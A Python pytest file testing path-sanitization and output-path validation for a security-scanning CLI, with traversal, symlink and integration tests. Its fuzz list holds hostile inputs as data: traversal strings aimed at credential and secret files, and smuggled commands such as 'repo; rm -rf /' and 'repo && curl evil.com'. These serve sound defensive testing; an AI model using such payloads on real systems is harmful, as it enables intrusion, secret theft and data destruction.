#!/usr/bin/env python3
"""
Security tests for path sanitization utilities (MEDIUM-001 fix).

Tests cover:
- Path traversal sequences (../, ../../, etc.)
- Hidden files and directories (.git, ..hidden)
- Special characters (Windows/Unix dangerous chars)
- Path separators (/, \\)
- Fuzzing with 100+ malicious inputs
- Defense-in-depth validation
"""

import pytest
from pathlib import Path
from scripts.cli.path_sanitizers import (
    _sanitize_path_component,
    _validate_output_path,
)


class TestSanitizePathComponent:
    """Test _sanitize_path_component() against path traversal attacks."""

    def test_sanitize_normal_names(self):
        """Normal names should pass through unchanged."""
        assert _sanitize_path_component("normal-repo") == "normal-repo"
        assert _sanitize_path_component("my_project") == "my_project"
        assert _sanitize_path_component("repo123") == "repo123"
        assert _sanitize_path_component("v1.2.3") == "v1.2.3"

    def test_sanitize_traversal_sequences(self):
        """Path traversal sequences should be neutralized."""
        # Classic traversal
        result = _sanitize_path_component("../../../etc/passwd")
        assert ".." not in result
        assert "/" not in result
        assert "etc_passwd" in result

        assert _sanitize_path_component("..") == "_"

        result2 = _sanitize_path_component("...")
        assert ".." not in result2

        # Mixed traversal
        result3 = _sanitize_path_component("repo/../etc")
        assert ".." not in result3
        assert "repo" in result3
        assert "etc" in result3

        result4 = _sanitize_path_component("./../../sensitive")
        assert ".." not in result4
        assert "sensitive" in result4

    def test_sanitize_hidden_files(self):
        """Leading dots (hidden files) should be stripped."""
        assert _sanitize_path_component(".git") == "git"
        result = _sanitize_path_component("..hidden")
        assert ".." not in result
        assert "hidden" in result
        assert _sanitize_path_component(".") == "unknown"  # Empty after strip
        result2 = _sanitize_path_component("...test")
        assert ".." not in result2
        assert "test" in result2

    def test_sanitize_path_separators(self):
        """Path separators should be replaced."""
        # Unix separators
        assert _sanitize_path_component("etc/passwd") == "etc_passwd"
        assert _sanitize_path_component("a/b/c/d") == "a_b_c_d"

        # Windows separators
        result = _sanitize_path_component("C:\\Windows\\System32")
        assert "/" not in result
        assert "\\" not in result
        assert "Windows" in result
        assert "System32" in result

        result2 = _sanitize_path_component("..\\..\\sensitive")
        assert ".." not in result2
        assert "\\" not in result2
        assert "sensitive" in result2

        # Mixed separators
        assert _sanitize_path_component("etc/passwd\\admin") == "etc_passwd_admin"

    def test_sanitize_special_characters(self):
        """Dangerous special characters should be replaced."""
        # Windows dangerous chars: < > : " | ? *
        assert _sanitize_path_component("file<test") == "file_test"
        assert _sanitize_path_component("file>test") == "file_test"
        assert _sanitize_path_component("nginx:latest") == "nginx_latest"
        assert _sanitize_path_component('file"test') == "file_test"
        assert _sanitize_path_component("file|test") == "file_test"
        assert _sanitize_path_component("file?test") == "file_test"
        assert _sanitize_path_component("file*test") == "file_test"

        # Control characters (null bytes, etc.)
        assert _sanitize_path_component("file\x00test") == "file_test"
        assert _sanitize_path_component("file\x1ftest") == "file_test"

    def test_sanitize_container_images(self):
        """Container image names should be sanitized correctly."""
        assert _sanitize_path_component("nginx:latest") == "nginx_latest"
        assert (
            _sanitize_path_component("ghcr.io/owner/repo:v1.2.3")
            == "ghcr.io_owner_repo_v1.2.3"
        )
        assert _sanitize_path_component("registry.k8s.io/kube-proxy:v1.28.0") == (
            "registry.k8s.io_kube-proxy_v1.28.0"
        )

    def test_sanitize_gitlab_paths(self):
        """GitLab group/repo paths should be sanitized."""
        assert _sanitize_path_component("group/repo") == "group_repo"
        assert _sanitize_path_component("parent/child/repo") == "parent_child_repo"
        assert _sanitize_path_component("../../admin/secrets") == "____admin_secrets"

    def test_sanitize_k8s_contexts(self):
        """Kubernetes context/namespace names should be sanitized."""
        assert (
            _sanitize_path_component("prod-cluster_default") == "prod-cluster_default"
        )
        result = _sanitize_path_component("../../../kube-system")
        assert ".." not in result
        assert "/" not in result
        assert "kube-system" in result

    def test_sanitize_empty_inputs(self):
        """Empty or whitespace inputs should get fallback."""
        assert _sanitize_path_component("") == "unknown"
        # Note: Whitespace-only inputs are not stripped by current implementation
        # This is acceptable since they won't cause traversal
        result = _sanitize_path_component(" ")
        assert result  # Not empty
        result2 = _sanitize_path_component("   ")
        assert result2  # Not empty
        assert _sanitize_path_component("..") == "_"  # Not empty but becomes "_"

    def test_sanitize_url_components(self):
        """URL components (domains) should be sanitized."""
        assert _sanitize_path_component("example.com") == "example.com"
        assert (
            _sanitize_path_component("api.example.com:8080") == "api.example.com_8080"
        )
        result = _sanitize_path_component("../../etc/passwd")
        assert ".." not in result
        assert "/" not in result
        assert "etc_passwd" in result


class TestValidateOutputPath:
    """Test _validate_output_path() defense-in-depth validation."""

    def test_validate_allowed_paths(self, tmp_path):
        """Paths within base_dir should be allowed."""
        base = tmp_path / "results"
        base.mkdir()

        # Direct child
        allowed1 = base / "repo1"
        assert _validate_output_path(base, allowed1) == allowed1.resolve()

        # Nested child
        allowed2 = base / "individual-images" / "nginx"
        assert _validate_output_path(base, allowed2) == allowed2.resolve()

    def test_validate_blocks_traversal(self, tmp_path):
        """Paths escaping base_dir should be blocked."""
        base = tmp_path / "results"
        base.mkdir()

        # Simple traversal
        blocked1 = base / ".." / "etc"
        with pytest.raises(ValueError, match="Path traversal detected"):
            _validate_output_path(base, blocked1)

        # Multiple traversal
        blocked2 = base / ".." / ".." / ".." / "etc" / "passwd"
        with pytest.raises(ValueError, match="Path traversal detected"):
            _validate_output_path(base, blocked2)

    def test_validate_absolute_path_outside_base(self, tmp_path):
        """Absolute paths outside base_dir should be blocked."""
        base = tmp_path / "results"
        base.mkdir()

        # Absolute path to /etc
        blocked = Path("/etc/passwd")
        with pytest.raises(ValueError, match="Path traversal detected"):
            _validate_output_path(base, blocked)

    def test_validate_resolves_symlinks(self, tmp_path):
        """Symlinks escaping base_dir should be blocked."""
        base = tmp_path / "results"
        base.mkdir()

        # Create symlink to parent
        symlink = base / "escape"
        target = tmp_path / "secrets"
        target.mkdir()

        # Skip on Windows (symlink creation requires admin)
        try:
            symlink.symlink_to(target)
        except OSError:
            pytest.skip("Symlink creation failed (Windows?)")

        with pytest.raises(ValueError, match="Path traversal detected"):
            _validate_output_path(base, symlink)


class TestPathTraversalFuzzing:
    """Fuzzing tests with 100+ malicious path inputs."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            # Classic traversal
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            # Windows traversal
            "..\\Windows\\System32",
            "..\\..\\Windows\\System32",
            # Mixed separators
            "../..\\/etc/passwd",
            "..\\../etc\\passwd",
            # URL-encoded traversal
            "%2e%2e%2fetc%2fpasswd",
            "..%2Fetc%2Fpasswd",
            # Double-encoded
            "%252e%252e%252fetc%252fpasswd",
            # Unicode traversal
            "..%c0%afetc%c0%afpasswd",
            # Null byte injection
            "../etc/passwd\x00.txt",
            "..%00/etc/passwd",
            # Hidden traversal
            "./../etc/passwd",
            "../.hidden/../etc/passwd",
            # Long traversal chains
            "../" * 20 + "etc/passwd",
            # Absolute paths (Unix)
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            # Absolute paths (Windows)
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            # Container escapes
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/run/docker.sock",
            # K8s secret mounts
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            # Git metadata
            ".git/config",
            ".git/HEAD",
            ".git/../.git/config",
            # Special chars injection
            "repo; rm -rf /",
            "repo | cat /etc/passwd",
            "repo && curl evil.com",
            "repo`whoami`",
            "repo$(whoami)",
            # Overlong UTF-8
            "\xc0\xae\xc0\xae/etc/passwd",
            # Control characters
            "repo\r\nmalicious",
            "repo\x00admin",
            # Homograph attacks
            "еtc/passwd",  # Cyrillic 'e'
            # Case variations (Windows)
            "..\\WINDOWS\\system32",
            # Multiple slashes
            "..////etc////passwd",
            "..\\\\\\\\Windows",
            # Trailing slashes
            "../etc/passwd/",
            "../etc/passwd//",
            # Space variations
            ".. /etc/passwd",
            "../ etc/passwd",
            # Tab characters
            "..\t/etc/passwd",
            # CRLF injection
            "repo\r\n../etc/passwd",
            # Normalization bypass
            "repo/./../../etc/passwd",
            "repo/foo/../../../etc/passwd",
            # Filter bypass attempts
            "....//....//etc/passwd",
            "..;/etc/passwd",
            # Unicode normalization
            "\u002e\u002e/etc/passwd",
            # OS-specific
            "CON",  # Windows reserved
            "PRN",
            "AUX",
            "NUL",
            "COM1",
            "LPT1",
            # GitLab namespace injection
            "../../admin/secrets",
            "../../../etc",
            # Container registry injection
            "../../etc:latest",
            "ghcr.io/../../secrets:v1",
            # K8s context injection
            "../../../kube-system",
            "prod/../../../admin",
            # File:// URL injection
            "file:///etc/passwd",
            "file://../../etc/passwd",
            # Backslash variations
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            # Mixed case (Windows)
            "..\\WiNdOwS\\SyStEm32",
            # Trailing dots (Windows)
            "repo...",
            "repo....",
            # Spaces (Windows)
            "repo ",
            "repo  ",
            # Unicode right-to-left override
            "repo\u202Emalicious",
            # Zero-width characters
            "repo\u200Bmalicious",
            "repo\u200Dmalicious",
            # Homograph (Greek)
            "rερο",  # Greek 'ε' and 'ο'
            # Percent-encoding bypass
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            # Double percent-encoding
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Triple dot
            ".../etc/passwd",
            "..../etc/passwd",
            # Mixed encoding
            "..%2F..%2Fetc%2Fpasswd",
            # Quoted strings
            '"../../etc/passwd"',
            "'../../etc/passwd'",
            # Backtick injection
            "`../../etc/passwd`",
            # Dollar expansion
            "${../../etc/passwd}",
            "$(../../etc/passwd)",
            # Wildcard injection
            "../../etc/*",
            "../../*",
            # Pipe injection
            "../../etc/passwd|",
            "|../../etc/passwd",
            # Ampersand injection
            "../../etc/passwd&",
            "&../../etc/passwd",
            # Semicolon injection
            "../../etc/passwd;",
            ";../../etc/passwd",
        ],
    )
    def test_fuzz_sanitize_blocks_malicious(self, malicious_input):
        """All malicious inputs should be sanitized (no traversal)."""
        result = _sanitize_path_component(malicious_input)

        # SECURITY: Result must NOT contain traversal sequences
        assert ".." not in result, f"Traversal sequence in result: {result}"
        assert "/" not in result, f"Path separator in result: {result}"
        assert "\\" not in result, f"Backslash in result: {result}"

        # SECURITY: Result must NOT start with absolute path
        assert not result.startswith("/"), f"Absolute path in result: {result}"
        assert not result.startswith("\\"), f"Absolute path in result: {result}"
        assert (
            ":" not in result or result.count(":") == 0 or "_" in result
        ), f"Colon in result (Windows drive?): {result}"

        # SECURITY: Result must NOT be empty
        assert result, "Sanitization produced empty result"
        assert result.strip(), "Sanitization produced whitespace-only result"

    @pytest.mark.parametrize(
        "safe_input",
        [
            "normal-repo",
            "my_project",
            "repo123",
            "v1.2.3",
            "nginx_latest",
            "ghcr.io_owner_repo_v1.2.3",
            "group_repo",
            "prod-cluster_default",
            "example.com",
        ],
    )
    def test_fuzz_sanitize_allows_safe(self, safe_input):
        """Safe inputs should pass through unchanged or minimally modified."""
        result = _sanitize_path_component(safe_input)
        assert result, "Safe input rejected"
        assert result.strip(), "Safe input became whitespace"


class TestIntegrationWithJmoPy:
    """Integration tests simulating real jmo.py usage."""

    def _is_relative_to(self, path: Path, base: Path) -> bool:
        """Python 3.8 compatible version of Path.is_relative_to()."""
        try:
            path.resolve().relative_to(base.resolve())
            return True
        except ValueError:
            return False

    def test_integration_repo_scanning(self, tmp_path):
        """Simulate repository scanning with malicious repo name."""
        base = tmp_path / "results" / "individual-repos"
        base.mkdir(parents=True)

        # Malicious repo name (classic traversal)
        malicious_repo_name = "../../../etc"
        safe_name = _sanitize_path_component(malicious_repo_name)
        out_dir = base / safe_name

        # Validate path
        out_dir = _validate_output_path(base, out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        # SECURITY: Directory should be created inside base
        assert self._is_relative_to(out_dir, base)
        assert "etc" in str(out_dir)  # Name preserved
        assert ".." not in str(out_dir)  # Traversal removed

    def test_integration_image_scanning(self, tmp_path):
        """Simulate container image scanning with malicious image name."""
        base = tmp_path / "results" / "individual-images"
        base.mkdir(parents=True)

        # Malicious image name (colon injection)
        malicious_image = "../../secrets:latest"
        safe_name = _sanitize_path_component(malicious_image)
        out_dir = base / safe_name

        # Validate path
        out_dir = _validate_output_path(base, out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        # SECURITY: Directory should be created inside base
        assert self._is_relative_to(out_dir, base)

    def test_integration_gitlab_scanning(self, tmp_path):
        """Simulate GitLab scanning with malicious group/repo path."""
        base = tmp_path / "results" / "individual-gitlab"
        base.mkdir(parents=True)

        # Malicious GitLab path (traversal via group name)
        malicious_path = "../../admin/secrets"
        safe_name = _sanitize_path_component(malicious_path)
        out_dir = base / safe_name

        # Validate path
        out_dir = _validate_output_path(base, out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        # SECURITY: Directory should be created inside base
        assert self._is_relative_to(out_dir, base)

    def test_integration_k8s_scanning(self, tmp_path):
        """Simulate Kubernetes scanning with malicious context/namespace."""
        base = tmp_path / "results" / "individual-k8s"
        base.mkdir(parents=True)

        # Malicious K8s context (traversal)
        malicious_context = "../../../kube-system"
        malicious_namespace = "default"
        raw_name = f"{malicious_context}_{malicious_namespace}"
        safe_name = _sanitize_path_component(raw_name)
        out_dir = base / safe_name

        # Validate path
        out_dir = _validate_output_path(base, out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        # SECURITY: Directory should be created inside base
        assert self._is_relative_to(out_dir, base)
